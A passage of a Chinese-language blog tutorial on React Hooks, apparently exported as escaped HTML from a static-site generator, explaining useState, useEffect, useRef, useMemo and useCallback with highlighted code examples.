class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// index.js</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> React <span class=\"keyword\">from</span> <span class=\"string\">&#x27;react&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> ReactDOM <span class=\"keyword\">from</span> <span class=\"string\">&#x27;react-dom&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; StoreProvider &#125; <span class=\"keyword\">from</span> <span class=\"string\">&#x27;./store&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; ChildComponent &#125; <span class=\"keyword\">from</span> <span class=\"string\">&#x27;./childComponent&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">App</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (</span><br><span class=\"line\">    &lt;StoreProvider&gt;</span><br><span class=\"line\">      &lt;ChildComponent/&gt;</span><br><span class=\"line\">    &lt;/StoreProvider&gt;</span><br><span class=\"line\">  );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> rootElement = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">&#x27;root&#x27;</span>);</span><br><span class=\"line\">ReactDOM.render(<span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">App</span> /&gt;</span></span>, rootElement);</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// childComponent.js</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> React <span class=\"keyword\">from</span> <span class=\"string\">&#x27;react&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; useStore &#125; <span class=\"keyword\">from</span> <span class=\"string\">&#x27;./store&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">const</span> ChildComponent = <span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> &#123;state, dispatch&#125; = useStore();</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> (</span><br><span class=\"line\">    &lt;div&gt;</span><br><span class=\"line\">      &#123;state.count&#125;</span><br><span class=\"line\">      &lt;button onClick=&#123;<span class=\"function\">() =&gt;</span> dispatch(&#123;<span class=\"attr\">type</span>: <span class=\"string\">&#x27;increment&#x27;</span>, <span class=\"attr\">message</span>:<span class=\"string\">&#x27;Incremented&#x27;</span>&#125;)&#125;&gt;+&lt;/button&gt;</span><br><span class=\"line\">      &lt;button onClick=&#123;<span class=\"function\">() =&gt;</span> dispatch(&#123;<span class=\"attr\">type</span>: <span class=\"string\">&#x27;decrement&#x27;</span>, <span class=\"attr\">message</span>: <span class=\"string\">&#x27;Decremented&#x27;</span>&#125;)&#125;&gt;-&lt;/button&gt;</span><br><span class=\"line\">      &lt;button onClick=&#123;<span class=\"function\">() =&gt;</span> dispatch(&#123;<span class=\"attr\">type</span>: <span class=\"string\">&#x27;reset&#x27;</span>, <span class=\"attr\">message</span>: <span class=\"string\">&#x27;Reset&#x27;</span>&#125;)&#125;&gt;Reset&lt;/button&gt;</span><br><span class=\"line\">      &#123;state.message&#125;</span><br><span class=\"line\">    &lt;/div&gt;</span><br><span class=\"line\">  )</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"React-Hooks\"><a href=\"#React-Hooks\" class=\"headerlink\" title=\"React Hooks\"></a>React Hooks</h1><p>Hooks 是辅助 Function Component 的一种工具，用于管理函数组件的状态、生命周期、副作用等</p>\n<h2 id=\"1-useState\"><a href=\"#1-useState\" class=\"headerlink\" title=\"1. useState\"></a>1. useState</h2><h3 id=\"1-1-使用方式\"><a href=\"#1-1-使用方式\" class=\"headerlink\" title=\"1.1 使用方式\"></a>1.1 使用方式</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> App = <span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> [count, setCount] = useState(<span class=\"number\">0</span>)</span><br><span class=\"line\">    <span class=\"keyword\">const</span> [name, setName] = useState(<span class=\"string\">&#x27;Jack&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">const</span> [age, setAge] = useState(<span class=\"number\">18</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">const</span> onClick = <span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">        setCount(count + <span class=\"number\">1</span>)</span><br><span class=\"line\">        setAge(age + <span class=\"number\">1</span>)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">        &lt;&gt;</span><br><span class=\"line\">            &lt;p&gt;You clicked &#123;count&#125; times&lt;/p&gt;</span><br><span class=\"line\">            &lt;p&gt;Your age is &#123;age&#125;&lt;/p&gt;</span><br><span class=\"line\">            &lt;p&gt;Your name is &#123;name&#125;&lt;/p&gt;</span><br><span class=\"line\">            &lt;button onClick=&#123;onClick&#125;&gt;</span><br><span class=\"line\">                Click me</span><br><span class=\"line\">            &lt;/button&gt;</span><br><span class=\"line\">        &lt;/&gt;</span><br><span class=\"line\">    )</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> App</span><br></pre></td></tr></table></figure>\n\n<p>在 Class Component 中通过 this.state 方式读取 state，每次执行都会拿到最新的 state 引用，而 Function Component 中不是通过 this. 的方式获取到的 state，而是当时渲染闭包环境的 state 数据，所以取到的值依然是旧的渲染值</p>\n<p>说明：每次调用 <code>setCount</code>、<code>setAge</code> 时都会重新执行整个函数式组件，包括初始化数据，调用 <code>useState</code>、<code>useEffect</code>，注册事件等，最后返回 <code>VNode</code> 对象（每次重新 <code>render</code> 组件时取出来的 <code>state</code> 是缓存中的值，即上一次 <code>state</code> 的值或初始值）</p>\n<blockquote>\n<p>useState 的初始值只在第一次渲染时有效，之后从 state 中取出的值都是缓存的值</p>\n</blockquote>\n<h3 id=\"1-2-实现原理\"><a href=\"#1-2-实现原理\" class=\"headerlink\" title=\"1.2 实现原理\"></a>1.2 实现原理</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// useState 基本实现原理</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> memoizedState = [] <span class=\"comment\">// hooks 的值存放在这个数组里</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> cursor = <span class=\"number\">0</span> <span class=\"comment\">// 当前 memoizedState 的索引</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">useState</span>(<span class=\"params\">initialValue</span>) </span>&#123;</span><br><span class=\"line\">    memoizedState[cursor] = memoizedState[cursor] || initialValue</span><br><span class=\"line\">    <span class=\"keyword\">const</span> currentCursor = cursor</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">setState</span>(<span class=\"params\">newState</span>) </span>&#123;</span><br><span class=\"line\">        memoizedState[currentCursor] = newState</span><br><span class=\"line\">        cursor = <span class=\"number\">0</span></span><br><span class=\"line\">        render(<span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">App</span> /&gt;</span></span>, <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">&#x27;root&#x27;</span>))</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> [memoizedState[cursor++], setState] <span class=\"comment\">// 返回当前 state，并把 cursor 加 1</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>useState 原理</strong></p>\n<ul>\n<li>初次渲染时，每次 <code>useState</code> 执行时都会将对应的 <code>setState</code> 绑定到对应索引的位置（用于更新指定的 <code>state</code>），然后将初始 <code>state</code> 存入 <code>memoizedState</code> 中</li>\n<li>触发 <code>setCount</code> 和 <code>setAge</code> 时，每个 <code>setState</code> 都有其对应索引的引用，因此触发对应的 <code>setState</code> 会改变对应位置的 <code>state</code> 的值</li>\n<li>每次执行 <code>setState</code> 都有一次重新渲染的过程，将 <code>cursor</code> 重置为 <code>0</code>，重新按顺序取得 <code>state</code> 里面的值（已缓存上一次 <code>state</code> 里的值）</li>\n</ul>\n<p><code>Hooks</code> 需要确保 <code>Hook</code> 在每一次渲染中都按照同样的顺序被调用，因为 <code>memoizedState</code> 是按 <code>Hooks</code> 定义的顺序来放置数据的，如果 <code>Hooks</code> 的顺序变化，<code>memoizedState</code> 并不会感知到。所以最好每次只在最顶层使用 <code>Hook，不要在循环、条件、嵌套函数中调用</code> <code>Hooks。</code></p>\n<blockquote>\n<p><code>useState</code> 返回更新 <code>state</code> 的函数与 <code>class</code> 组件的 <code>this.setState</code> 不同，它不会把新的 <code>state</code> 和旧的 <code>state</code> 进行合并，而是直接替换，相当于直接返回一个新的对象</p>\n</blockquote>\n<p>每次 setState 后都会重新渲染，渲染时的 state、props、useEffect、事件处理函数都是独立的，获取到的值是此次 rerender 时的数据</p>\n<p>利用 useRef 就可以绕过 Capture Value 的特性。可以认为 ref 在所有 Render 过程中保持着唯一引用，因此所有对 ref 的赋值或取值，拿到的都只有一个最终状态，而不会在每个 Render 间存在隔离</p>\n<h2 id=\"2-useEffect\"><a href=\"#2-useEffect\" class=\"headerlink\" title=\"2. useEffect\"></a>2. useEffect</h2><p>useEffect 在每次 render 执行完后再执行，用于处理数据副操作，用于在函数组件里实现 class 的生命周期</p>\n<ul>\n<li>useEffect(() =&gt; {}): 每次 render 后执行，类似于 <code>componentDidUpdate</code></li>\n<li>useEffect(() =&gt; { return cleanUpFn }，[]): 挂载后执行一次，销毁时执行一次 cleanupFn，功能类似于 <code>componentDidMount</code> 和 <code>componentWillUnmount</code></li>\n<li>useEffect(() =&gt; {}，[state1, state2]): 每次 state1 或 state2 变化后执行，功能类似于 Vue 中的 <code>watch</code></li>\n</ul>\n<blockquote>\n<p>在第一次渲染之后和每次更新之后都会执行，可以根据依赖项进行控制，执行顺序为 <code>setState</code> –&gt; <code>render</code> –&gt; <code>useEffect</code><br>useEffect 里面使用到的 state 的值, 固定在了 useEffect 内部（闭包环境），引用地址不会再变化</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">useEffect(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> timer = <span class=\"built_in\">setInterval</span>(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;---&#x27;</span>)</span><br><span class=\"line\">  &#125;, <span class=\"number\">1000</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">clearInterval</span>(timer)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;,[])</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>必须将 <code>函数</code> 写在 <code>useEffect</code> 内部，这样 <code>eslint-plugin-react-hooks</code> 才能通过静态分析补齐依赖项</li>\n<li>所有函数都写在 useEffect 内部会导致难以维护，可以使用 <code>useCallback</code></li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Counter</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> [count, setCount] = useState(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">const</span> getFetchUrl = useCallback(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&#x27;https://v?query=&#x27;</span> + count;</span><br><span class=\"line\">  &#125;, [count]);</span><br><span class=\"line\"></span><br><span class=\"line\">  useEffect(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">    getFetchUrl();</span><br><span class=\"line\">  &#125;, [getFetchUrl]);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>&#123;count&#125;<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"3-useRef\"><a href=\"#3-useRef\" class=\"headerlink\" title=\"3. useRef\"></a>3. useRef</h2><p><code>useRef</code> 可以用于访问 DOM 节点、React 组件实例或作为容器保存可变变量</p>\n<blockquote>\n<p>useRef 返回一个可变的 ref 对象，其 .current 属性被初始化为传入的参数（initialValue）。返回的 ref 对象在组件的整个生命周期内保持不变。通过 current 属性可以访问到 DOM 节点</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">TextInputWithFocusButton</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> inputEl = useRef(<span class=\"literal\">null</span>);</span><br><span class=\"line\">  <span class=\"keyword\">const</span> onButtonClick = <span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">    inputEl.current.focus(); <span class=\"comment\">// `current` 指向已挂载到 DOM 上的文本输入元素</span></span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (</span><br><span class=\"line\">    &lt;&gt;</span><br><span class=\"line\">      &lt;input ref=&#123;inputEl&#125; type=<span class=\"string\">&quot;text&quot;</span> /&gt;</span><br><span class=\"line\">      &lt;button onClick=&#123;onButtonClick&#125;&gt;Focus the input&lt;/button&gt;</span><br><span class=\"line\">    &lt;/&gt;</span><br><span class=\"line\">  );</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 获取上一轮的 props 或 state</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">usePrevious</span>(<span class=\"params\">value</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> ref = useRef(); <span class=\"comment\">// 此处的 ref 相当于是全局变量，re-render 时并不会被回收</span></span><br><span class=\"line\">  useEffect(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">    ref.current = value;</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> ref.current;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n<h2 id=\"4-useMemo\"><a href=\"#4-useMemo\" class=\"headerlink\" title=\"4.useMemo\"></a>4.useMemo</h2><p>用于缓存值，避免在每次渲染时都进行高开销的计算</p>\n<p><code>const memoizedValue = useMemo(() =&gt; computeExpensiveValue(a, b), [a, b]);</code></p>\n<p>用于缓存值，把 “创建” 函数和依赖项数组作为参数传入 <code>useMemo</code>，它仅会在某个依赖项改变时才重新计算 <code>memoized</code> 值。这种优化有助于避免在每次渲染时都进行高开销的计算。类似于 Vue 中的 <code>computed</code> 属性。</p>\n<blockquote>\n<p>函数组件里的某一个 state 变化时，都会重新执行整个函数并渲染，逻辑从上到下重新执行一遍</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">WithMemo</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">const</span> [count, setCount] = useState(<span class=\"number\">1</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">const</span> [val, setValue] = useState(<span class=\"string\">&#x27;&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// 缓存了昂贵的计算</span></span><br><span class=\"line\">\t<span class=\"keyword\">const</span> expensive = useMemo(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;compute&#x27;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">let</span> sum = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; count * <span class=\"number\">100</span>; i++) &#123;</span><br><span class=\"line\">\t\t\tsum += i;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> sum;</span><br><span class=\"line\">\t&#125;, [count]);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (</span><br><span class=\"line\">\t\t&lt;div&gt;</span><br><span class=\"line\">\t\t\t&lt;h4&gt;&#123;count&#125;-&#123;expensive&#125;&lt;/h4&gt;</span><br><span class=\"line\">\t\t\t&lt;div&gt;</span><br><span class=\"line\">\t\t\t\t&lt;button onClick=&#123;<span class=\"function\">() =&gt;</span> setCount(count + <span class=\"number\">1</span>)&#125;&gt;+c1&lt;<span class=\"regexp\">/button&gt;            &lt;input value=&#123;val&#125; onChange=&#123;event =&gt; setValue(event.target.value)&#125; /</span>&gt;</span><br><span class=\"line\">\t\t\t&lt;/div&gt;</span><br><span class=\"line\">\t\t&lt;/div&gt;</span><br><span class=\"line\">\t);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"5-useCallback\"><a href=\"#5-useCallback\" class=\"headerlink\" title=\"5. useCallback\"></a>5. useCallback</h2><p><code>const memoizedCb = useMemo(() =&gt; doSomething(a, b), [a, b]);</code></p>\n<p>用于<strong>缓存函数</strong>，返回一个 memoized 回调函数，根据依赖项来决定是否更新函数</p>\n<p>在 class component 中通过 shouldComponentUpdate 或 getDerivedStateFromProps 中判断前后的 props 和 state，如果没有变化，则阻止更新，而 16.8 版本前的 function component 没有生命周期钩子用来优化性能，且函数组件每次调用都会执行其内部环境的所有逻辑，因此用 useMemo 和 useCallback 处理优化性能问题。</p>\n<blockquote>\n<p>把内联回调函数及依赖项数组作为参数传入 useCallback，它将返回该回调函数的 memoized 版本，该回调函数仅在某个依赖项改变时才会更新。当你把回调函数传递给经过优化的并使用引用相等性去避免非必要渲染（例如 shouldComponentUpdate）的子组件时，它将非常有用。</p>\n</blockquote>\n<blockquote>\n<p>React.memo 为高阶组件。它与 React.PureComponent 非常相似，但只适用于函数组件，而不适用 class 组件，能对props做浅比较，防止组件无效的重复渲染</p>\n</blockquote>\n<p>有一个父组件，其中包含子组件，子组件接收一个函数作为 props；通常而言，如果父组件更新了，子组件也会执行更新；但是大多数场景下，更新是没有必要的，我们可以借助useCallback来返回函数，然后把这个函数作为props传递给子组件；这样，子组件就能避免不必要的更新。</p>\n<p>例如：父组件传递一个函数给子组件的时候，由于父组件的更新会导致该函数重新生成从而传递给子组件的函数引用发生了变化，这就会导致子组件也会更新，而很多时候子组件的更新是没必要的，所以我们可以通过 <code>useCallback</code> 来缓存该函数，然后传递给子组件，用于减少子组件不必要的重新渲染。</p>\n<p><strong>note:</strong> useCallback 需与 memo 结合使用，否则没有意义</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">useFetch</span>(<span class=\"params\">count, step</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> useCallback(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> url = <span class=\"string\">&quot;https://v/search?query=&quot;</span> + count + <span class=\"string\">&quot;&amp;step=&quot;</span> + step;</span><br><span class=\"line\">  &#125;, [count, step]);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 父组件</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> Parent = <span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">const</span> [count, setCount] = useState(<span class=\"number\">1</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">const</span> [val, setVal] = useState(<span class=\"string\">&#x27;&#x27;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">const</span> callback = useCallback(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> count;</span><br><span class=\"line\">\t&#125;, [count]);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (</span><br><span class=\"line\">\t\t&lt;div&gt;</span><br><span class=\"line\">\t\t\t&lt;h4&gt;&#123;count&#125;&lt;/h4&gt;</span><br><span class=\"line\">\t\t\t&lt;Child callback=&#123;callback&#125; /&gt;</span><br><span class=\"line\">\t\t\t&lt;div&gt;</span><br><span class=\"line\">\t\t\t\t&lt;button onClick=&#123;<span class=\"function\">() =&gt;</span> setCount(count + <span class=\"number\">1</span>)&#125;&gt;+&lt;/button&gt;</span><br><span class=\"line\">\t\t\t\t&lt;input value=&#123;val&#125; onChange=&#123;<span class=\"function\"><span class=\"params\">event</span> =&gt;</span> setVal(event.target.value)&#125; /&gt;</span><br><span class=\"line\">\t\t\t&lt;/div&gt;</span><br><span class=\"line\">\t\t&lt;/div&gt;</span><br><span class=\"line\">\t);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 子组件</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> Child = <span class=\"function\">(<span class=\"params\">&#123; callback &#125;</span>) =&gt;</span> &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">const</span> [count, setCount] = useState(<span class=\"function\">() =&gt;</span> callback());</span><br><span class=\"line\">\tuseEffect(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">\t\tsetCount(callback());</span><br><span class=\"line\">\t&#125;, [callback]);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span>&#123;count&#125;<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> React.memo(Child) <span class=\"comment\">// 用React.memo包裹</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"5-1-何时使用-useMemo、useCallback\"><a href=\"#5-1-何时使用-useMemo、useCallback\" class=\"headerlink\" title=\"5.1 何时使用 useMemo、useCallback\"></a>5.1 何时使用 useMemo、useCallback</h3><ul>\n<li>需要保持对象、函数的引用地址相等（核心）</li>\n<li>对于组件内部用到的 object、array、函数等，如果用在了其他 Hook 的依赖数组中，或者作为 props 传递给了下游组件，应该使用 useMemo 和 useCallback</li>\n<li>自定义 Hook 中暴露出来的 object、array、函数等，都应该使用useMemo 和 useCallback,以确保当值相同时，引用不发生变化</li>\n</ul>\n<p>React.memo 和 React.PureComponent 类似， React.PureComponent 在类组件中使用，而 React.memo 在函数组件中使用</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 父组件</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> Parent = <span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">const</span> [count, setCount] = useState(<span class=\"number\">1</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">const</span> [val, setVal] = 